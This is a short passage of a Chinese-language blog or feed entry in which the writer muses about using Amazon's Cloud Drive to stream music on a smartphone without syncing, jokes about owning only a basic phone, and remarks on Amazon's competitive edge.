+<p>我一直想著拿著一台iphone或android走在路上搖頭晃腦聽音樂，如果用這個Cloud Drive就很方便啦，不用同步來同步去的。(可惜本人還是使用只能打電話的手機，哈哈!) 看了Amazon，我不禁想到一句：這叫其它廠商怎麼混啊!</p>
 ]]></content>
   </entry>
   
